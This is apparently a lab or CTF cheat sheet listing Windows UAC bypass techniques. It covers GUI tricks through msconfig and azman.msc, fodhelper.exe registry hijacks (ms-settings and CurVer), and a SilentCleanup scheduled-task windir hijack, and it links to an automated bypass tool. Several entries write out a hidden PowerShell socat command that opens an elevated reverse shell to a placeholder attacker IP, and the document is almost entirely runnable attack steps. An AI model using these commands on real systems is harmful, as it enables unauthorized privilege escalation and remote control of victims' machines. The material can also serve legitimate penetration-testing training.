### Using MSCONFIG:
```
Launch msconfig
Surf to Tools tab
Choose command prompt and click launch
It will spawn a CMD with High IL.
```

### *Using Azman:
```
Launch azman.msc
Click Help -> Help topics from the Tabs
Right click and View Source, this will open the source as elevated Notepad.exe
Chose File->Open in Notepad.exe 
Chose all files and surf to C:\Windows\System32
Right click on cmd.exe and choose open
It will spawn a CMD with High IL.
```

### Using Fodhelter.exe
(usefull in Revshells)
```
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f
Setup a listener on the attackers machine.
Run fodhelper.exe in the victim and it will spawn a shell on the listening host.
```

### Using Fodhelter.exe CURVER
(usefull in Revshells)
```
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
Setup a listener on the attackers machine.
Run fodhelper.exe in the victim and it will spawn a shell on the listening host.
```

### Using Disk Cleanup Scheduled Task 
```
Check that you have a Scheduled task running the Silent cleunup under Disk cleanup with Highest priviledge
Edit the %windir% environment path with: reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f
Run the Disk clenup: schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```

### Automatic tools
https://github.com/hfiref0x/UACME